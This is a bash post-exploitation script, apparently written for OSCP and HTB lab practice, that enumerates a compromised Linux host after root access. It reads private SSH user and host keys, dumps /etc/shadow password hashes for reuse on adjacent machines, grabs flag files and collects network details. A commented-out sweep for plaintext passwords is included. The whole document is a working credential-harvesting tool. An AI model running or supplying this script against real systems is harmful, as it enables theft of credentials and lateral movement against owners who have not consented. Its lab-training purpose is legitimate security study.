#!/bin/bash
echo "
------------------------------------------------------------------------------
                      ++++POST ROOT LOOT+++++
-------------------------------------------------------------------------------
 Author: WillChaos
 Script: PostRootLoot.sh
 Intention: Standandard post root enum for OSCP (data collection)
            This can be handy for reusing hashes on adjacent boxes etc
             Formated output for simple copy/paste into one-note or whatever
 ---------------------------- --------------- ---------------------------------


"



# hostname , kernal version & release
echo "[________________________________________________________________________]"
echo "[                           OS INFO                                      ]"
echo "[------------------------------------------------------------------------]"
echo " "
echo "[*] hostname: "
     hostname
echo "[*] kernal: "
     uname -a
echo "[*] release: "
     cat /etc/lsb-release & cat /etc/redhat-release 2>/dev/null
echo " "
echo "[------------------------------------------------------------------------]"

# get  flags (user.txt) (optimise this to work with HTB machines too)
echo "[________________________________________________________________________]"
echo "[                           Flags / Proof                                ]"
echo "[------------------------------------------------------------------------]"
echo " "
echo "[*] user.txt: TODO"
echo "[*] root.txt: "
     cat /root/root.txt 2>/dev/null & cat /root/proof.txt 2>/dev/null
echo "[+] other user flags found: TODO"
echo " "
echo "[------------------------------------------------------------------------]"

# get networking information
echo "[________________________________________________________________________]"
echo "[                           Network INFO                                 ]"
echo "[------------------------------------------------------------------------]"
echo " "
echo "[*] IP Configuration: "
      ifconfig

echo "[*] listening services: "
      netstat -plnt

echo "[*] Gateway: "
      route -n

echo "[*] DNS Settings"
      cat /etc/resolv.conf

echo " "
echo "[------------------------------------------------------------------------]"

# Get users / hashes
echo "[________________________________________________________________________]"
echo "[                             User INFO                                  ]"
echo "[------------------------------------------------------------------------]"
echo " "
echo "[*] Users on box: "
      cat /etc/passwd | cut -d : -f 1

echo "[*] Users with shell: "
     cat /etc/passwd | cut -d : -f 1,7 | sed -n '/nologin/!p' | sed -n '/false/!p'

echo "[*] Users home directories: "
     getent passwd | cut -d: -f6

echo "[*] SSH keys found: "
    cat ~/.ssh/authorized_keys 2>/dev/null
    cat ~/.ssh/identity.pub 2>/dev/null
    cat ~/.ssh/identity 2>/dev/null
    cat ~/.ssh/id_rsa.pub 2>/dev/null
    cat ~/.ssh/id_rsa 2>/dev/null
    cat ~/.ssh/id_dsa.pub 2>/dev/null
    cat ~/.ssh/id_dsa 2>/dev/null
    cat /etc/ssh/ssh_config 2>/dev/null
    cat /etc/ssh/sshd_config 2>/dev/null
    cat /etc/ssh/ssh_host_dsa_key.pub 2>/dev/null
    cat /etc/ssh/ssh_host_dsa_key 2>/dev/null
    cat /etc/ssh/ssh_host_rsa_key.pub 2>/dev/null
    cat /etc/ssh/ssh_host_rsa_key 2>/dev/null
    cat /etc/ssh/ssh_host_key.pub 2>/dev/null
    cat /etc/ssh/ssh_host_key 2>/dev/null
echo "[*] Users hashes: "
    cat /etc/shadow | cut -d : -f 1,2 | sed -n '/*/!p' | sed -n '/!/!p'

echo " "
echo "[------------------------------------------------------------------------]"



# Plaintext password sweep 
echo "[________________________________________________________________________]"
echo "[                           password sweep                               ]"
echo "[------------------------------------------------------------------------]"
echo " "
echo "[*] searching for all: '.config' files , filtering for: 'password'b "
echo "todo.."
    #find / -maxdepth 4 -name *.conf -type f -exec grep -Hn password {} ; 2>/dev/null
